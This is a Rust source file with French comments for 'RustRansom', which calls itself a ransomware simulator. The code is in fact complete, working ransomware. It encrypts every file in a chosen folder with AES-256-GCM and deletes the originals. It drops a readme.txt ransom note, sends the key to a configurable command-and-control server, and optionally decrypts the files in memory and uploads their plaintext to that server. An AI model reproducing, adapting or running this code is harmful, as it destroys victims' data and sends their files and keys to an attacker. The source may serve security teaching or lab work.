/*!
 * # RustRansom Client - Simulateur de Ransomware
 *
 * Ce programme implémente un simulateur de ransomware en Rust qui chiffre/déchiffre des fichiers
 * avec AES-256-GCM, exfiltre des fichiers (en clair) vers un serveur C2, et crée un readme.txt
 * contenant la clé de récupération et des instructions pour déchiffrer les fichiers.
 *
 * ## Usage - Affichage de l'aide
 * ```sh
 * ./target/release/rustransom_client -h
 * ```
 *
 * ## Usage - Chiffrement
 * ```sh
 * ./target/release/rustransom_client -e -t <dossier> [-s <C2_IP>] [-p <PORT>] [-x] [-c]
 * ```
 * - `-e` : Mode chiffrement.
 * - `-t <dossier>` : Dossier cible à chiffrer.
 * - `-s <C2_IP>` : IP du serveur C2 (défaut : 127.0.0.1).
 * - `-p <PORT>` : Port du serveur C2 (défaut : 8080).
 * - `-x` : Active l'exfiltration des fichiers vers le serveur C2 (les fichiers sont envoyés en clair, c'est-à-dire déchiffrés en mémoire).
 * - `-c` : Conserve une copie des fichiers originaux après chiffrement.
 *
 * ## Usage - Déchiffrement
 * ```sh
 * ./target/release/rustransom_client -d -t <dossier> -k <clé>
 * ```
 * - `-d` : Mode déchiffrement.
 * - `-t <dossier>` : Dossier cible à déchiffrer.
 * - `-k <clé>` : Clé de déchiffrement (en hexadécimal, 64 caractères).
 *
 * ## Compilation
 * ```sh
 * cargo build --release
 * ```
 */

 use aes_gcm::{Aes256Gcm, KeyInit, Nonce, aead::Aead};
 use generic_array::GenericArray;
 use generic_array::typenum::U32;
 use std::fs::{self, File};
 use std::io::{Read, Write};
 use std::path::Path;
 use std::env;
 use reqwest::blocking::Client;
 use indicatif::{ProgressBar, ProgressStyle};
 use rand::Rng;
 
 const AES_KEY_SIZE: usize = 32;
 const NONCE_SIZE: usize = 12;
 const ENCRYPTED_EXTENSION: &str = ".psr";
 const README_FILENAME: &str = "readme.txt";
 
 const README_BANNER: &str = r#" 888888ba                      dP    888888ba                                                 
  88    `8b                     88    88    `8b                                                
 a88aaaa8P' dP    dP .d8888b. d8888P a88aaaa8P' .d8888b. 88d888b. .d8888b. .d8888b. 88d8b.d8b. 
  88   `8b. 88    88 Y8ooooo.   88    88   `8b. 88'  `88 88'  `88 Y8ooooo. 88'  `88 88'`88'`88 
  88     88 88.  .88       88   88    88     88 88.  .88 88    88       88 88.  .88 88  88  88 
  dP     dP `88888P' `88888P'   dP    dP     dP `88888P8 dP    dP `88888P' `88888P' dP  dP  dP
 "#;
 
 /// Affiche la bannière et un bref tutoriel d'utilisation
 fn show_banner() {
     println!("{}", README_BANNER);
     println!(r#"
 Usage - Chiffrement:
   ./target/release/rustransom_client -e -t <dossier> [-s <C2_IP>] [-p <PORT>] [-x] [-c]
 Usage - Déchiffrement:
   ./target/release/rustransom_client -d -t <dossier> -k <clé>
 Usage - Aide:
   ./target/release/rustransom_client -h
 ⚠️  Veillez à bien spécifier un dossier existant et des options valides.
 "#);
 }
 
 /// Affiche l'aide complète et quitte le programme
 fn show_help() {
     show_banner();
     println!(r#"
 Ce programme fonctionne en deux modes : chiffrement (-e) et déchiffrement (-d).
 
 En mode chiffrement :
   - Tous les fichiers du dossier cible seront chiffrés avec AES-256-GCM.
   - Un fichier readme.txt sera créé dans le dossier cible et dans le dossier d'exfiltration,
     contenant :
       * La bannière ci-dessus.
       * Le message : "Tous vos fichiers ont été chiffrés par RustRansom!
          Mais ne vous inquiétez pas, vous pouvez toujours les récupérer avec la clé de récupération."
       * La clé de récupération.
       * La commande à utiliser pour déchiffrer :
          Pour déchiffrer vos fichiers, utilisez la commande suivante :
          ./rustransom_client -d -t <dossier> -k <clé>
       * La liste des fichiers chiffrés, par exemple :
          [!] /chemin/vers/fichier1 est maintenant chiffré
          [!] /chemin/vers/fichier2 est maintenant chiffré
   - La clé sera envoyée au serveur C2.
   - Si l'option -x est spécifiée, chaque fichier chiffré sera déchiffré en mémoire et envoyé en clair au serveur C2 via l'endpoint /files/<nom_du_fichier>.
   - Options supplémentaires :
       - -s <C2_IP> : Spécifie l'IP du serveur C2 (défaut : 127.0.0.1).
       - -p <PORT>  : Spécifie le port du serveur C2 (défaut : 8080).
       - -c         : Conserve une copie des fichiers originaux après chiffrement.
 En mode déchiffrement :
   - Les fichiers du dossier cible portant l'extension "{}" seront déchiffrés.
   - Vous devez fournir la clé de déchiffrement (format hexadécimal, 64 caractères) via l'option -k.
   
 Exemple pour chiffrement avec exfiltration :
   ./target/release/rustransom_client -e -t /chemin/vers/dossier -s 192.168.1.100 -p 8080 -x
 Exemple pour déchiffrement :
   ./target/release/rustransom_client -d -t /chemin/vers/dossier -k <clé>
 "#, ENCRYPTED_EXTENSION);
     std::process::exit(0);
 }
 
 /// Génère une clé AES aléatoire
 fn generate_aes_key() -> [u8; AES_KEY_SIZE] {
     let mut key = [0u8; AES_KEY_SIZE];
     rand::thread_rng().fill(&mut key);
     key
 }
 
 /// Crée un fichier readme.txt dans le dossier cible avec la bannière, la clé et les logs.
 fn create_readme(target: &Path, key: &[u8; AES_KEY_SIZE], logs: &[String]) -> Result<(), Box<dyn std::error::Error>> {
     let key_hex: String = key.iter().map(|b| format!("{:02x}", b)).collect();
     let mut content = String::new();
     content.push_str(README_BANNER);
     content.push_str("\nTous vos fichiers ont été chiffrés par RustRansom!\n");
     content.push_str("Mais ne vous inquiétez pas, vous pouvez toujours les récupérer avec la clé de récupération.\n\n");
     content.push_str(&format!("Clé de récupération: {}\n\n", key_hex));
     content.push_str("Pour déchiffrer vos fichiers, utilisez la commande suivante :\n");
     content.push_str("./rustransom_client -d -t <dossier> -k <clé>\n\n");
     for log in logs {
         content.push_str(&format!("{}\n", log));
     }
     let readme_path = target.join(README_FILENAME);
     let mut file = File::create(readme_path)?;
     file.write_all(content.as_bytes())?;
     Ok(())
 }
 
 /// Chiffre un fichier avec AES-256-GCM.
 fn encrypt_file(path: &Path, key: &[u8; AES_KEY_SIZE], keep_copy: bool) -> Result<(), Box<dyn std::error::Error>> {
     let mut file = File::open(&path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
     
     let key_array: &GenericArray<u8, U32> = GenericArray::from_slice(key);
     let cipher = Aes256Gcm::new(key_array);
     
     // Générer un nonce aléatoire (utilisation de r#gen pour contourner le mot réservé)
     let nonce_bytes = rand::thread_rng().r#gen::<[u8; NONCE_SIZE]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
     
     let ciphertext = cipher.encrypt(nonce, buffer.as_ref())
         .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, format!("Encryption error: {:?}", e)))?;
     
     let encrypted_filename = format!("{}{}", path.to_str().unwrap(), ENCRYPTED_EXTENSION);
     let mut encrypted_file = File::create(&encrypted_filename)?;
     encrypted_file.write_all(&nonce_bytes)?;
     encrypted_file.write_all(&ciphertext)?;
     
     if !keep_copy {
         fs::remove_file(path)?;
     }
     Ok(())
 }
 
 /// Déchiffre un fichier chiffré avec AES-256-GCM et retourne le contenu déchiffré en mémoire.
 fn decrypt_file_to_memory(path: &Path, key: &[u8; AES_KEY_SIZE]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let mut file = File::open(&path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
     
     if buffer.len() < NONCE_SIZE {
         return Err(std::io::Error::new(std::io::ErrorKind::Other, "Fichier trop court pour contenir un nonce valide").into());
     }
     
     let (nonce_bytes, ciphertext) = buffer.split_at(NONCE_SIZE);
     let key_array: &GenericArray<u8, U32> = GenericArray::from_slice(key);
     let cipher = Aes256Gcm::new(key_array);
     let nonce = Nonce::from_slice(nonce_bytes);
     let plaintext = cipher.decrypt(nonce, ciphertext)
         .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, format!("Decryption error: {:?}", e)))?;
     Ok(plaintext)
 }
 
 /// Déchiffre le fichier puis le supprime (mode déchiffrement local).
 fn decrypt_file(path: &Path, key: &[u8; AES_KEY_SIZE]) -> Result<(), Box<dyn std::error::Error>> {
     let plaintext = decrypt_file_to_memory(path, key)?;
     let original_filename = path.with_extension("");
     let mut decrypted_file = File::create(&original_filename)?;
     decrypted_file.write_all(&plaintext)?;
     fs::remove_file(path)?;
     Ok(())
 }
 
 /// Envoie la clé de chiffrement au serveur C2.
 fn send_to_c2(server: &str, port: u16, key: &[u8; AES_KEY_SIZE]) {
     let client = Client::new();
     let key_hex: String = key.iter().map(|b| format!("{:02x}", b)).collect();
     let url = format!("http://{}:{}/data", server, port);
     let res = client.post(&url)
         .body(key_hex)
         .send();
     match res {
         Ok(_) => println!("[+] Clé envoyée au serveur C2!"),
         Err(e) => eprintln!("[!] Échec de l'envoi de la clé: {}", e),
     }
 }
 
 /// Exfiltre tous les fichiers chiffrés du dossier cible vers le serveur C2.
 /// Pour chaque fichier, il déchiffre le contenu en mémoire et l'envoie en clair via une requête POST à /files/<nom>.
 fn exfiltrate_files(target: &Path, server: &str, port: u16, key: &[u8; AES_KEY_SIZE]) {
     println!("[+] Début de l'exfiltration des fichiers chiffrés...");
     let client = Client::new();
 
     // Exfiltrer les fichiers chiffrés
     for entry in fs::read_dir(target).expect("Impossible de lire le dossier cible") {
         if let Ok(entry) = entry {
             let path = entry.path();
             if path.is_file() && path.to_str().unwrap().ends_with(ENCRYPTED_EXTENSION) {
                 // Récupérer le nom original du fichier (en retirant l'extension)
                 let file_stem = match path.file_stem() {
                     Some(stem) => stem.to_string_lossy().to_string(),
                     None => continue,
                 };
                 let url = format!("http://{}:{}/files/{}", server, port, file_stem);
                 match decrypt_file_to_memory(&path, key) {
                     Ok(plaintext) => {
                         match client.post(&url).body(plaintext).send() {
                             Ok(resp) => {
                                 if resp.status().is_success() {
                                     println!("[✔] Fichier exfiltré (en clair): {}", file_stem);
                                 } else {
                                     eprintln!("[❌] Erreur exfiltration pour {}: code {}", file_stem, resp.status());
                                 }
                             },
                             Err(e) => eprintln!("[❌] Erreur d'envoi pour {}: {}", file_stem, e),
                         }
                     },
                     Err(e) => eprintln!("[❌] Erreur lors du déchiffrement en mémoire de {}: {}", file_stem, e),
                 }
             }
         }
     }
     // Exfiltrer également le readme.txt
     let readme_path = target.join(README_FILENAME);
     if readme_path.exists() {
         let file_stem = README_FILENAME;
         let url = format!("http://{}:{}/files/{}", server, port, file_stem);
         match fs::read(&readme_path) {
             Ok(readme_data) => {
                 match client.post(&url).body(readme_data).send() {
                     Ok(resp) => {
                         if resp.status().is_success() {
                             println!("[✔] Fichier readme exfiltré.");
                         } else {
                             eprintln!("[❌] Erreur exfiltration pour readme.txt: code {}", resp.status());
                         }
                     },
                     Err(e) => eprintln!("[❌] Erreur d'envoi pour readme.txt: {}", e),
                 }
             },
             Err(e) => eprintln!("[❌] Erreur lors de la lecture du readme.txt: {}", e),
         }
     }
     println!("[✔] Exfiltration terminée.");
 }
 
 fn main() {
     let args: Vec<String> = env::args().collect();
     if args.iter().any(|arg| arg == "-h") {
         show_help();
     }
     
     show_banner();
     
     if args.len() < 3 {
         eprintln!("[❌] Erreur: Pas assez de paramètres.\nPour l'aide, utilisez -h.");
         return;
     }
     
     let mode = args[1].as_str();
     let mut target_dir = "";
     let mut c2_ip = "127.0.0.1";
     let mut c2_port = 8080;
     let mut key_input = String::new();
     let mut exfiltrate = false;
     let mut keep_copy = false;
     
     let mut i = 2;
     while i < args.len() {
         match args[i].as_str() {
             "-t" => {
                 if i + 1 < args.len() {
                     target_dir = &args[i+1];
                     i += 1;
                 } else {
                     eprintln!("[❌] Erreur: Dossier cible non spécifié après -t.");
                     return;
                 }
             },
             "-s" => {
                 if i + 1 < args.len() {
                     c2_ip = &args[i+1];
                     i += 1;
                 } else {
                     eprintln!("[❌] Erreur: IP du serveur C2 non spécifiée après -s.");
                     return;
                 }
             },
             "-p" => {
                 if i + 1 < args.len() {
                     c2_port = args[i+1].parse().unwrap_or(8080);
                     i += 1;
                 } else {
                     eprintln!("[❌] Erreur: Port non spécifié après -p.");
                     return;
                 }
             },
             "-k" => {
                 if i + 1 < args.len() {
                     key_input = args[i+1].clone();
                     i += 1;
                 } else {
                     eprintln!("[❌] Erreur: Clé non spécifiée après -k.");
                     return;
                 }
             },
             "-x" => {
                 exfiltrate = true;
             },
             "-c" => {
                 keep_copy = true;
             },
             _ => {
                 if args[i] != "-h" {
                     eprintln!("[❌] Erreur: Option inconnue `{}`.", args[i]);
                     return;
                 }
             }
         }
         i += 1;
     }
     
     let target_path = Path::new(target_dir);
     if !target_path.exists() || !target_path.is_dir() {
         eprintln!("[❌] Erreur: Le dossier cible spécifié n'existe pas ou n'est pas un dossier.");
         return;
     }
     
     if mode == "-e" {
         println!("[+] Mode chiffrement activé.");
         let key = generate_aes_key();
         let mut logs: Vec<String> = Vec::new();
         let pb = ProgressBar::new(100);
         pb.set_style(ProgressStyle::default_bar().template("[{elapsed_precise}] {bar:40.cyan/blue} {pos:>7}/{len:7} {msg}"));
         
         println!("[+] Chiffrement des fichiers dans {}...", target_path.display());
         for entry in fs::read_dir(target_path).expect("Impossible de lire le dossier cible") {
             let entry = entry.expect("Erreur de lecture d'une entrée");
             let path = entry.path();
             if path.is_file() {
                 if let Ok(()) = encrypt_file(&path, &key, keep_copy) {
                     let log_line = format!("[!] {} est maintenant chiffré", path.display());
                     println!("{}", log_line);
                     logs.push(log_line);
                     pb.inc(10);
                 } else {
                     eprintln!("[❌] Erreur lors du chiffrement de {}.", path.display());
                 }
             }
         }
         pb.finish_with_message("[✔] Chiffrement terminé.");
         
         // Création du readme.txt dans le dossier cible
         if let Err(e) = create_readme(target_path, &key, &logs) {
             eprintln!("[❌] Erreur lors de la création du readme.txt: {}", e);
         } else {
             println!("[✔] Fichier readme.txt créé avec la clé de déchiffrement et les logs.");
         }
         
         println!("[+] Envoi de la clé au serveur C2...");
         send_to_c2(c2_ip, c2_port, &key);
         if exfiltrate {
             exfiltrate_files(target_path, c2_ip, c2_port, &key);
         }
     } else if mode == "-d" {
         if key_input.is_empty() {
             eprintln!("[❌] Erreur: La clé de déchiffrement doit être spécifiée avec -k en mode déchiffrement.");
             return;
         }
         let key_bytes = match hex::decode(&key_input) {
             Ok(bytes) => bytes,
             Err(_) => {
                 eprintln!("[❌] Erreur: La clé fournie n'est pas un hexadécimal valide.");
                 return;
             }
         };
         if key_bytes.len() != AES_KEY_SIZE {
             eprintln!("[❌] Erreur: La clé doit être de 32 octets (64 caractères hexadécimaux).");
             return;
         }
         let mut key = [0u8; AES_KEY_SIZE];
         key.copy_from_slice(&key_bytes);
         
         println!("[+] Mode déchiffrement activé.");
         for entry in fs::read_dir(target_path).expect("Impossible de lire le dossier cible") {
             let entry = entry.expect("Erreur de lecture d'une entrée");
             let path = entry.path();
             if path.is_file() && path.to_str().unwrap().ends_with(ENCRYPTED_EXTENSION) {
                 match decrypt_file(&path, &key) {
                     Ok(_) => println!("[✔] Fichier déchiffré: {}", path.display()),
                     Err(e) => eprintln!("[❌] Erreur lors du déchiffrement de {}: {}", path.display(), e),
                 }
             }
         }
         println!("[✔] Déchiffrement terminé.");
     } else {
         eprintln!("[❌] Erreur: Mode invalide. Utilisez -e pour chiffrement ou -d pour déchiffrement.");
     }
 }
 